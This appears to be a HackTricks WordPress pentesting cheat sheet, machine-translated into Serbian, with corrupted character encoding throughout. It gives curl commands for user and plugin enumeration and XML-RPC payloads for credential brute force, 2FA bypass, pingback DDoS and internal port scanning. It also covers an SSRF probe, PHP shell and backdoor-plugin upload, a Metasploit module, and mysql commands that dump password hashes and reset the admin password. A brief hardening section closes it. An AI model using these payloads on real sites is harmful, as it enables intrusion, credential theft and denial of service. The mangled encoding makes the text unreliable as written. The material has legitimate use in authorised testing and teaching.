# Wordpress

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Basic Information

**Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**Teme se mogu naÄ‡i u /wp-content/themes/,** tako da ako promenite neki php u temi da biste dobili RCE, verovatno Ä‡ete koristiti taj put. Na primer: KoristeÄ‡i **temu twentytwelve** moÅ¾ete **pristupiti** **404.php** datoteci u: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**JoÅ¡ jedan koristan url moÅ¾e biti:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

U **wp-config.php** moÅ¾ete pronaÄ‡i root lozinku baze podataka.

Podrazumevani putanje za prijavu koje treba proveriti: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

* `index.php`
* `license.txt` sadrÅ¾i korisne informacije kao Å¡to je verzija WordPress-a koja je instalirana.
* `wp-activate.php` se koristi za proces aktivacije putem e-poÅ¡te prilikom postavljanja novog WordPress sajta.
* Folderi za prijavu (mogu biti preimenovani da bi se sakrili):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` je datoteka koja predstavlja funkciju WordPress-a koja omoguÄ‡ava prenos podataka putem HTTP-a kao transportnog mehanizma i XML-a kao mehanizma kodiranja. Ova vrsta komunikacije je zamenjena WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
* Folder `wp-content` je glavni direktorijum gde se Äuvaju dodaci i teme.
* `wp-content/uploads/` je direktorijum gde se Äuvaju sve datoteke koje su otpremljene na platformu.
* `wp-includes/` Ovo je direktorijum gde se Äuvaju osnovne datoteke, kao Å¡to su sertifikati, fontovi, JavaScript datoteke i dodaci.
* `wp-sitemap.xml` U verzijama WordPress-a 5.5 i veÄ‡im, WordPress generiÅ¡e XML datoteku mape sajta sa svim javnim postovima i javno upitnim tipovima postova i taksonomijama.

**Post exploitation**

* Datoteka `wp-config.php` sadrÅ¾i informacije potrebne WordPress-u za povezivanje sa bazom podataka, kao Å¡to su ime baze podataka, host baze podataka, korisniÄko ime i lozinka, kljuÄevi za autentifikaciju i soli, i prefiks tabela baze podataka. Ova konfiguraciona datoteka se takoÄ‘e moÅ¾e koristiti za aktiviranje DEBUG moda, Å¡to moÅ¾e biti korisno u reÅ¡avanju problema.

### Users Permissions

* **Administrator**
* **Editor**: Objavljuje i upravlja svojim i tuÄ‘im postovima
* **Author**: Objavljuje i upravlja svojim postovima
* **Contributor**: PiÅ¡e i upravlja svojim postovima, ali ih ne moÅ¾e objaviti
* **Subscriber**: Pregleda postove i ureÄ‘uje svoj profil

## **Passive Enumeration**

### **Get WordPress version**

Proverite da li moÅ¾ete pronaÄ‡i datoteke `/license.txt` ili `/readme.html`

Unutar **izvora koda** stranice (primer sa [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* CSS link datoteke

![](<../../.gitbook/assets/image (533).png>)

* JavaScript datoteke

![](<../../.gitbook/assets/image (524).png>)

### Preuzmi dodatke

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Preuzmi Teme

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ekstraktovanje verzija uopÅ¡te

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim **alatima** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Aktivna enumeracija

### Dodaci i Teme

Verovatno neÄ‡ete moÄ‡i da pronaÄ‘ete sve moguÄ‡e Dodace i Teme. Da biste otkrili sve njih, biÄ‡e potrebno da **aktivno Brute Force-ujete listu Dodataka i Tema** (na sreÄ‡u, postoje automatski alati koji sadrÅ¾e ove liste).

### Korisnici

**ID Brute**

Dobijate vaÅ¾eÄ‡e korisnike sa WordPress sajta tako Å¡to Brute Forcujete ID-eve korisnika:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
Ako su odgovori **200** ili **30X**, to znaÄi da je id **validan**. Ako je odgovor **400**, onda je id **nevalidan**.

**wp-json**

TakoÄ‘e moÅ¾ete pokuÅ¡ati da dobijete informacije o korisnicima upitom:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
JoÅ¡ jedan `/wp-json/` krajnji taÄka koja moÅ¾e otkriti neke informacije o korisnicima je:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Napomena da ovaj krajnji taÄka samo izlaÅ¾e korisnike koji su napravili post. **Samo informacije o korisnicima koji imaju ovu funkciju omoguÄ‡enu Ä‡e biti pruÅ¾ene**.

TakoÄ‘e napomena da **/wp-json/wp/v2/pages** moÅ¾e da otkrije IP adrese.

#### Enumeracija korisniÄkog imena za prijavu

Kada se prijavljujete u **`/wp-login.php`**, **poruka** je **drugaÄija** u zavisnosti od toga da li je **korisniÄko ime prisutno ili ne**.

### XML-RPC

Ako je `xml-rpc.php` aktivan, moÅ¾ete izvrÅ¡iti brute-force napad na kredencijale ili ga koristiti za pokretanje DoS napada na druge resurse. (MoÅ¾ete automatizovati ovaj proces[ koristeÄ‡i ovo](https://github.com/relarizky/wpxploit) na primer).

Da biste proverili da li je aktivan, pokuÅ¡ajte da pristupite _**/xmlrpc.php**_ i poÅ¡aljete ovaj zahtev:

**Proveri**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce kredencijali**

**`wp.getUserBlogs`**, **`wp.getCategories`** ili **`metaWeblog.getUsersBlogs`** su neke od metoda koje se mogu koristiti za bruteforce kredencijale. Ako moÅ¾ete pronaÄ‡i neku od njih, moÅ¾ete poslati neÅ¡to poput:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Poruka _"PogreÅ¡no korisniÄko ime ili lozinka"_ unutar odgovora sa kodom 200 treba da se pojavi ako akreditivi nisu validni.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (721).png>)

KoriÅ¡Ä‡enjem ispravnih akreditiva moÅ¾ete otpremiti datoteku. U odgovoru Ä‡e se pojaviti putanja ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
TakoÄ‘e postoji **brÅ¾i naÄin** za brute-force kredencijale koristeÄ‡i **`system.multicall`** jer moÅ¾ete pokuÅ¡ati nekoliko kredencijala u istom zahtevu:

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**ObilaÅ¾enje 2FA**

Ova metoda je namenjena programima, a ne ljudima, i stara je, stoga ne podrÅ¾ava 2FA. Dakle, ako imate vaÅ¾eÄ‡e kredencijale, ali je glavni ulaz zaÅ¡tiÄ‡en 2FA, **moÅ¾da Ä‡ete moÄ‡i da zloupotrebite xmlrpc.php da se prijavite sa tim kredencijalima obilaÅ¾eÄ‡i 2FA**. Imajte na umu da neÄ‡ete moÄ‡i da izvrÅ¡ite sve radnje koje moÅ¾ete da uradite putem konzole, ali moÅ¾da Ä‡ete i dalje moÄ‡i da doÄ‘ete do RCE-a kao Å¡to Ippsec objaÅ¡njava u [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS ili skeniranje portova**

Ako moÅ¾ete pronaÄ‡i metodu _**pingback.ping**_ unutar liste, moÅ¾ete naterati Wordpress da poÅ¡alje proizvoljan zahtev bilo kom hostu/portu.\
Ovo se moÅ¾e koristiti da se zatraÅ¾i **hiljade** Wordpress **sajtova** da **pristupe** jednoj **lokaciji** (tako da se izazove **DDoS** u toj lokaciji) ili moÅ¾ete to koristiti da naterate **Wordpress** da **skanira** neku internu **mreÅ¾u** (moÅ¾ete naznaÄiti bilo koji port).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ako dobijete **faultCode** sa vrednoÅ¡Ä‡u **veÄ‡om** od **0** (17), to znaÄi da je port otvoren.

Pogledajte koriÅ¡Ä‡enje **`system.multicall`** u prethodnom odeljku da biste nauÄili kako da zloupotrebite ovu metodu za izazivanje DDoS-a.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

Ova datoteka obiÄno postoji u korenu Wordpress sajta: **`/wp-cron.php`**\
Kada se ova datoteka **pristupi**, izvrÅ¡ava se "**teÅ¾ak**" MySQL **upit**, tako da je mogu koristiti **napadaÄi** da **uzrokuju** **DoS**.\
TakoÄ‘e, po defaultu, `wp-cron.php` se poziva pri svakom uÄitavanju stranice (svaki put kada klijent zatraÅ¾i neku Wordpress stranicu), Å¡to na sajtovima sa visokim prometom moÅ¾e izazvati probleme (DoS).

PreporuÄuje se da se onemoguÄ‡i Wp-Cron i da se kreira pravi cronjob unutar hosta koji izvrÅ¡ava potrebne radnje u redovnim intervalima (bez izazivanja problema).

### /wp-json/oembed/1.0/proxy - SSRF

PokuÅ¡ajte da pristupite _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i Wordpress sajt moÅ¾e da poÅ¡alje zahtev ka vama.

Ovo je odgovor kada ne funkcioniÅ¡e:

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Ovaj alat proverava da li **methodName: pingback.ping** i za putanju **/wp-json/oembed/1.0/proxy** i ako postoji, pokuÅ¡ava da ih iskoristi.

### Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim **alatima** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Pribavite pristup prepisivanjem jednog bita

ViÅ¡e od pravog napada, ovo je radoznalost. U CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) mogli ste da prebacite 1 bit iz bilo kog wordpress fajla. Tako ste mogli da prebacite poziciju `5389` fajla `/var/www/html/wp-includes/user.php` da NOP-ujete NOT (`!`) operaciju.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifikovanje php iz teme koja se koristi (potrebne admin akreditive)**

Izgled â†’ Urednik teme â†’ 404 Å ablon (s desne strane)

Promenite sadrÅ¾aj za php shell:

![](<../../.gitbook/assets/image (384).png>)

PretraÅ¾ite internet kako moÅ¾ete pristupiti toj aÅ¾uriranoj stranici. U ovom sluÄaju morate pristupiti ovde: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¾ete koristiti:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

MoÅ¾da je moguÄ‡e uploadovati .php fajlove kao plugin.\
Kreirajte svoj php backdoor koristeÄ‡i, na primer:

![](<../../.gitbook/assets/image (183).png>)

Zatim dodajte novi plugin:

![](<../../.gitbook/assets/image (722).png>)

Uploadujte plugin i pritisnite Install Now:

![](<../../.gitbook/assets/image (249).png>)

Kliknite na Procced:

![](<../../.gitbook/assets/image (70).png>)

Verovatno ovo neÄ‡e uÄiniti niÅ¡ta oÄigledno, ali ako odete na Media, videÄ‡ete vaÅ¡ shell uploadovan:

![](<../../.gitbook/assets/image (462).png>)

Pristupite mu i videÄ‡ete URL za izvrÅ¡avanje reverse shell-a:

![](<../../.gitbook/assets/image (1006).png>)

### Uploading and activating malicious plugin

Ova metoda ukljuÄuje instalaciju malicioznog plugina za koji se zna da je ranjiv i moÅ¾e se iskoristiti za dobijanje web shell-a. Ovaj proces se sprovodi kroz WordPress kontrolnu tablu na sledeÄ‡i naÄin:

1. **Plugin Acquisition**: Plugin se dobija iz izvora kao Å¡to je Exploit DB kao [**ovde**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
* Idite na WordPress kontrolnu tablu, zatim idite na `Dashboard > Plugins > Upload Plugin`.
* Uploadujte zip fajl preuzetog plugina.
3. **Plugin Activation**: Kada je plugin uspeÅ¡no instaliran, mora se aktivirati kroz kontrolnu tablu.
4. **Exploitation**:
* Sa instaliranim i aktiviranim pluginom "reflex-gallery", moÅ¾e se iskoristiti jer je poznato da je ranjiv.
* Metasploit framework pruÅ¾a exploit za ovu ranjivost. UÄitajte odgovarajuÄ‡i modul i izvrÅ¡ite specifiÄne komande da biste uspostavili meterpreter sesiju, Å¡to omoguÄ‡ava neovlaÅ¡Ä‡en pristup sajtu.
* Napominje se da je ovo samo jedna od mnogih metoda za iskoriÅ¡Ä‡avanje WordPress sajta.

SadrÅ¾aj ukljuÄuje vizuelne prikaze koji prikazuju korake u WordPress kontrolnoj tabli za instalaciju i aktivaciju plugina. MeÄ‘utim, vaÅ¾no je napomenuti da je iskoriÅ¡Ä‡avanje ranjivosti na ovaj naÄin ilegalno i neetiÄno bez odgovarajuÄ‡e dozvole. Ove informacije treba koristiti odgovorno i samo u legalnom kontekstu, kao Å¡to je pentesting sa izriÄitom dozvolom.

**Za detaljnije korake proverite:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

* [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ je skripta dizajnirana da eskalira **Cross-Site Scripting (XSS)** ranjivost na **Remote Code Execution (RCE)** ili druge kritiÄne ranjivosti u WordPress-u. Za viÅ¡e informacija proverite [**ovaj post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). PruÅ¾a **podrÅ¡ku za Wordpress verzije 6.X.X, 5.X.X i 4.X.X. i omoguÄ‡ava:**
* _**Privilege Escalation:**_ Kreira korisnika u WordPress-u.
* _**(RCE) Custom Plugin (backdoor) Upload:**_ Uploadujte svoj prilagoÄ‘eni plugin (backdoor) u WordPress.
* _**(RCE) Built-In Plugin Edit:**_ Uredite ugraÄ‘ene plugine u WordPress-u.
* _**(RCE) Built-In Theme Edit:**_ Uredite ugraÄ‘ene teme u WordPress-u.
* _**(Custom) Custom Exploits:**_ PrilagoÄ‘eni exploits za treÄ‡e strane WordPress plugine/teme.

## Post Exploitation

Izvucite korisniÄka imena i lozinke:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Promenite administratorsku lozinku:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Poznavanje naÄina na koji Wordpress plugin moÅ¾e izloÅ¾iti funkcionalnost je kljuÄno za pronalaÅ¾enje ranjivosti u njegovoj funkcionalnosti. MoÅ¾ete pronaÄ‡i kako plugin moÅ¾e izloÅ¾iti funkcionalnost u sledeÄ‡im taÄkama i neke primere ranjivih plugina u [**ovom blog postu**](https://nowotarski.info/wordpress-nonce-authorization/).

* **`wp_ajax`**&#x20;

Jedan od naÄina na koji plugin moÅ¾e izloÅ¾iti funkcije korisnicima je putem AJAX handlera. Ovi handleri mogu sadrÅ¾ati logiku, greÅ¡ke u autorizaciji ili autentifikaciji. Å taviÅ¡e, Äesto se deÅ¡ava da Ä‡e ove funkcije zasnivati i autentifikaciju i autorizaciju na postojanju wordpress nonce-a koji **bilo koji korisnik autentifikovan u Wordpress instanci moÅ¾e imati** (nezavisno od njegove uloge).

Ovo su funkcije koje se mogu koristiti za izlaganje funkcije u pluginu:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**KoriÅ¡Ä‡enje `nopriv` Äini krajnju taÄku dostupnom svim korisnicima (Äak i neautentifikovanim).**

{% hint style="danger" %}
Pored toga, ako funkcija samo proverava autorizaciju korisnika pomoÄ‡u funkcije `wp_verify_nonce`, ova funkcija samo proverava da li je korisnik prijavljen, obiÄno ne proverava ulogu korisnika. Tako da korisnici sa niskim privilegijama mogu imati pristup akcijama sa visokim privilegijama.
{% endhint %}

* **REST API**

TakoÄ‘e je moguÄ‡e izloÅ¾iti funkcije iz WordPress-a registrujuÄ‡i REST API koristeÄ‡i funkciju `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` je povratna funkcija koja proverava da li je dati korisnik ovlaÅ¡Ä‡en da pozove API metodu.

**Ako se koristi ugraÄ‘ena funkcija `__return_true`, jednostavno Ä‡e preskoÄiti proveru korisniÄkih dozvola.**

* **Direktan pristup php datoteci**

Naravno, Wordpress koristi PHP i datoteke unutar dodataka su direktno dostupne sa veba. Dakle, u sluÄaju da dodatak izlaÅ¾e bilo koju ranjivu funkcionalnost koja se aktivira samo pristupanjem datoteci, biÄ‡e iskoriÅ¡Ä‡ena od strane bilo kog korisnika.

## WordPress zaÅ¡tita

### Redovne aÅ¾uriranja

Uverite se da su WordPress, dodaci i teme aÅ¾urirani. TakoÄ‘e potvrdite da je automatsko aÅ¾uriranje omoguÄ‡eno u wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
TakoÄ‘e, **instalirajte samo pouzdane WordPress dodatke i teme**.

### Bezbednosni dodaci

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Ostale preporuke**

* Uklonite podrazumevanog **admin** korisnika
* Koristite **jake lozinke** i **2FA**
* PeriodiÄno **proveravajte** dozvole korisnika
* **OgraniÄite pokuÅ¡aje prijavljivanja** kako biste spreÄili Brute Force napade
* Preimenujte **`wp-admin.php`** datoteku i dozvolite pristup samo interno ili sa odreÄ‘enih IP adresa.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress) za lako kreiranje i **automatizaciju radnih tokova** uz pomoÄ‡ najnaprednijih **alata** zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
